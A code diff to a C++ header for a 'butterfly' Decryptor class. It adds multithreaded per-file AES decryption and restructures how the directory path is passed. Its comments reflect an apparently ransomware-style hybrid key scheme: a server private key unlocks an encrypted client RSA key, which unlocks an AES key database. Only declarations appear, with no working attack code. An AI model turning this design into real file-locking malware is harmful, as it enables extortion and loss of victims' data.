@@ -2,11 +2,13 @@
 #ifndef BUTTERFLY_DECRYPTOR_H
 #define BUTTERFLY_DECRYPTOR_H
 
+#include <thread>
+
 #include "crypto/rsaDecryptor.h"
 #include "crypto/aesDecryptor.h"
 #include "directoryIterator.h"
-#include "exceptions.h"
-#include "params.h"
+#include "bflyExceptions.h"
+#include "bflyParams.h"
 
 namespace butterfly
 {
@@ -21,7 +23,8 @@ class Decryptor
 {
 
 private:
-    std::string _decryptedCPrivateRSA, _aesKeyDBPath;
+    std::string _decryptedCPrivateRSA, _aesKeyDBPath, _dirPath;
+    std::vector<std::thread> _threads;
 
     std::unique_ptr<rsa::RSADecryptor> _rsaDecryptorCPrivateRSA;
     std::unique_ptr<aes::AESDecryptor> _aesDecryptor;
@@ -30,6 +33,14 @@ private:
      * Removes decrypted files from system
      */
     static void removeDecryptedFiles();
+
+    /**
+     * Get the AESKeyPair string from the unencrypted file
+     *
+     * @param aesKeyPair: string reference to the aeskeypair
+     * @return True if reading was successful else False
+     */
+    static bool getAESKeyPairFromUnencryptedFile(std::string &aesKeyPair);
 
 public:
 
@@ -50,12 +61,19 @@ public:
     ~Decryptor() = default;
 
     /**
+     * Sets the directory path for the decryption procedure
+     *
+     * @param dirPath: path to the directory
+     */
+    void setDirPath(const std::string &dirPath);
+
+    /**
      * Invokes the directory to start the decryption process
      *
      * @param dirPath: path to the directory
      * @param pkeyFromServer: SPrivateRSA.pem from server (corresponds to the embedded SPublicKey.pem)
      */
-    void invokeDir(const std::string &dirPath, const std::string &pkeyFromServer);
+    void invokeDir(const std::string &pkeyFromServer);
 
     /**
      * Decrypt the CPrivateRSA.bin file
@@ -81,8 +99,19 @@ public:
      * @param aesKey: aes key for the file to decrypt
      * @param aesIV: aes iv for the file to decrypt
      */
-    void decryptFileWithAES(const std::string &filepath, std::string &aesKey, std::string &aesIV);
+    void decryptFileWithAES(const std::string &filepath);
 
+    /**
+     * Spawns a new Thread for encrypting the file
+     *
+     * @param filepath: path to the file
+     */
+    void spawnThread(const std::string &filepath);
+
+    /**
+     * Joins the threads in the thread vector
+     */
+    void joinThreads();
 };
 
 } // namespace hybrid
